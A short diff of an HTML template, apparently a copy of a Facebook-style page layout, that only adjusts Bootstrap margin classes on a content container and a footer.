@@ -12,7 +12,7 @@
 
 <body>
     <div class="globalContainer main-content">
-        <div class="fb_content d-flex justify-content-center align-items-center">
+        <div class="fb_content d-flex justify-content-center align-items-center m-5">
             <div>
                 <div class="_8esj">
                     <div class="_82esk">
@@ -56,7 +56,7 @@
                 </div>
             </div>
         </div>
-        <div class="_95ke footer-fluid d-flex justify-content-center h-100 mb-0">
+        <div class="_95ke footer-fluid d-flex justify-content-center h-100">
             <div class="pageFooter">
                 <ul class="uiList list-unstyled d-flex m-2 gap-2">
                     <li>English (US)</li>
